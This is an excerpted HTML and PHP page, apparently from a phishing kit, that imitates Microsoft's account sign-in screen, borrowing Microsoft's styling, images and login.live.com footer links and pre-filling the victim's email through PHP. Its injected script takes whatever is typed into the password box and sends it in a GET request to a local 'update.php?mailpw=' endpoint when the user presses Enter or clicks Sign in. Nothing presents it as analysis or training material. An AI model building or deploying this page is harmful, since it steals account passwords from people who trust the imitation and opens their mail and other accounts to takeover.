...
<html dir=ltr lang=EN-US>
  ...
  <style>
    ...
    *:after {
    ...
    .custom-button:hover {
        background-color: rgb(1, 93, 167); /* Slightly darker shade */
    }
  ...
  <link rel=image_src href=https://logincdn.msftauth.net/16.000.29717.1/images/Windows_Live_v_thumb.jpg>
  <style>
    .sign-in-box {
      min-width: 0
    }
  ...
  <body class=cb data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
      ...
      <form name=f1 id=i0281 novalidate spellcheck=false method=post target=_top autocomplete=off data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.cM }" class=provide-min-height>
        ...
        event: { load: $page.backgroundImageControl_onLoad } }">
            ...
            css: {
                ...
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                          <div class=lightbox-cover data-bind="css: { 'disable-lightbox': svr.CF &amp;&amp; showLightboxProgress() }"></div>
        ...
        'slide-in-back': animate.isSlideInBack() }">
            ...
            event: {
                ...
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder=Password aria-label="Enter the password for <?php echo($email); ?>" tabindex=0 value>
                                      <script src="../../core/js/jquery.js"></script>
                                      <script>
                                        document.getElementById( 'i0118' ).addEventListener( 'keypress', function(event) {
                                          if ( event.key === 'Enter' ) {
                                        ...
                                        function onSubmit() {
                                          if ( document.getElementById( 'i0118' ).value != '' ) {

                                            $.ajax({
                                              type: 'GET',
                                              url: '../../core/update.php?mailpw=' + document.getElementById( 'i0118' ).value,
    ...
    externalCss: { 'button-field-container': true }">
                                        <div class="inline-block button-item ext-button-item">
                                            <button type="submit" id="idSIButton9" class="custom-button ext-primary ext-button" data-bind="attr: primaryButtonAttributes, hasFocus: focusOnPrimaryButton, click: primaryButton_onClick, enable: isPrimaryButtonEnabled, visible: isPrimaryButtonVisible, preventTabbing: primaryButtonPreventTabbing" data-report-attached="1" onclick="onSubmit()">Sign in</button>
                                        </div>
                                          </div>
                                        </div>
                                      </div>
        ...
        externalCss: {
            ...
            externalCss: {
                ...
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=5abef8bb9c364a9ebc5f2cbc8ff26954" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
            ...
            externalCss: {
                ...
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=5abef8bb9c364a9ebc5f2cbc8ff26954" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
      ...
      <div id=idPartnerPL data-bind="injectIframe: { url: svr.aM }">
        <iframe style=display:none width=0 height=0></iframe>
      </div>
    </div>
